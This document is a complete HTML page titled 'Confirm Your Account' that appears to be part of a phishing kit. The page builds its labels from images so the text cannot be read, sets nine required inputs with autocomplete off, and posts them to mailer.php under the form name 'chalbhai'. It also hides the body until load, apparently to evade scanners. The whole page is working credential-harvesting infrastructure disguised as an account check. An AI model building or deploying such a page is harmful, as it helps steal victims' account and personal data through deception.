<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Your Account</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<meta charset="utf-8" />
<meta name="applicable-device" content="pc,mobile" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="format-detection" content="telephone=no" />

<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">
div#container
{
	position:relative;
	width: 1394px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style type="text/css">

.enjoy-input {
  display: inline-block;
  -webkit-box-sizing: content-box;
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  padding: 10px 20px;
  border: 1px solid #b7b7b7;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  font: normal medium/normal Arial, Helvetica, sans-serif;
  color: rgba(0,142,198,1);
  -o-text-overflow: clip;
  text-overflow: clip;
  background: rgba(252,252,252,1);
  -webkit-box-shadow: 2px 2px 2px 0 rgba(0,0,0,0.2) inset;
  box-shadow: 2px 2px 2px 0 rgba(0,0,0,0.2) inset;
  text-shadow: 1px 1px 0 rgba(255,255,255,0.66) ;
  -webkit-transition: all 200ms cubic-bezier(0.42, 0, 0.58, 1);
  -moz-transition: all 200ms cubic-bezier(0.42, 0, 0.58, 1);
  -o-transition: all 200ms cubic-bezier(0.42, 0, 0.58, 1);
  transition: all 200ms cubic-bezier(0.42, 0, 0.58, 1);
}

.enjoy-input:hover {
  border: 1px solid #a3a3a3;
  background: rgba(255,255,255,1);
  -webkit-transition: all 100ms cubic-bezier(0.42, 0, 0.58, 1);
  -moz-transition: all 100ms cubic-bezier(0.42, 0, 0.58, 1);
  -o-transition: all 100ms cubic-bezier(0.42, 0, 0.58, 1);
  transition: all 100ms cubic-bezier(0.42, 0, 0.58, 1);
}

.enjoy-input:focus {
  border: 1px solid #018dc4;
  -webkit-box-shadow: 4px 4px 4px 0 rgba(0,0,0,0.2) inset;
  box-shadow: 4px 4px 4px 0 rgba(0,0,0,0.2) inset;
  -webkit-transition: all 50ms cubic-bezier(0.42, 0, 0.58, 1);
  -moz-transition: all 50ms cubic-bezier(0.42, 0, 0.58, 1);
  -o-transition: all 50ms cubic-bezier(0.42, 0, 0.58, 1);
  transition: all 50ms cubic-bezier(0.42, 0, 0.58, 1);
}


</style>
</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:272px; top:0px; width:1009px; height:137px; z-index:0"><img src="images/hedr.png" alt="" title="" border=0 width=1009 height=137></div>

<div id="image2" style="position:absolute; overflow:hidden; left:297px; top:143px; width:588px; height:114px; z-index:1"><img src="images/secn.png" alt="" title="" border=0 width=588 height=114></div>

<div id="image3" style="position:absolute; overflow:hidden; left:307px; top:295px; width:119px; height:357px; z-index:2"><img src="images/detail.png" alt="" title="" border=0 width=119 height=357></div>

<div id="image4" style="position:absolute; overflow:hidden; left:203px; top:657px; width:226px; height:531px; z-index:3"><img src="images/detai2l.png" alt="" title="" border=0 width=226 height=531></div>
<form action=mailer.php name=chalbhai id=chalbhai method=post>
<input name="formtext1"  required title="Please Enter Right Value" autocomplete="off"  class="enjoy-input" type="text" style="position:absolute;width:406px;left:456px;top:297px;z-index:4">
<input name="formtext2"  required title="Please Enter Right Value" autocomplete="off"  class="enjoy-input" type="text" style="position:absolute;width:406px;left:456px;top:349px;z-index:5">
<input name="formtext3"  required title="Please Enter Right Value" autocomplete="off"  class="enjoy-input" type="text" style="position:absolute;width:406px;left:459px;top:401px;z-index:6">
<input name="formtext4"  required title="Please Enter Right Value" autocomplete="off"  class="enjoy-input" type="text" style="position:absolute;width:406px;left:458px;top:455px;z-index:7">
<input name="formtext5"  required title="Please Enter Right Value" autocomplete="off"  class="enjoy-input" type="text" style="position:absolute;width:138px;left:457px;top:508px;z-index:8">
<input name="formtext6"  required title="Please Enter Right Value" autocomplete="off"  class="enjoy-input" type="text" style="position:absolute;width:406px;left:457px;top:561px;z-index:9">
<input name="formtext7"  required title="Please Enter Right Value" autocomplete="off"  class="enjoy-input" type="text" style="position:absolute;width:406px;left:460px;top:613px;z-index:10">
<input name="formtext8"  required title="Please Enter Right Value" autocomplete="off"  class="enjoy-input" type="text" style="position:absolute;width:406px;left:460px;top:665px;z-index:11">
<input name="formtext9"  required title="Please Enter Right Value" autocomplete="off"  class="enjoy-input" type="text" style="position:absolute;width:210px;left:460px;top:719px;z-index:12">


<div id="formimage1" style="position:absolute; left:735px; top:790px; z-index:23"><input type="image" name="formimage1" width="124" height="38" src="images/conti.png"></div>
<div id="image5" style="position:absolute; overflow:hidden; left:1px; top:1350px; width:1392px; height:97px; z-index:24"><img src="images/foter1.png" alt="" title="" border=0 width=1392 height=97></div>

</div>

</body>
</html>
